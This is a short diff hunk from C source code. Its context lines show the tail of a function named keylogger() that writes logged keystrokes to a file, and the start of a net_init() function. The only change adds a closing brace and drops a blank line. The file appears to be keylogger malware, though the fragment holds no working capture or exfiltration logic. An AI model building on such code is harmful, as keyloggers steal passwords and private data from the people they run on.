@@ -229,8 +229,8 @@ void keylogger()
 					write(log, "[?]", 3);
 			}
 		}
+	}
 }
-
 
 int net_init()
 {
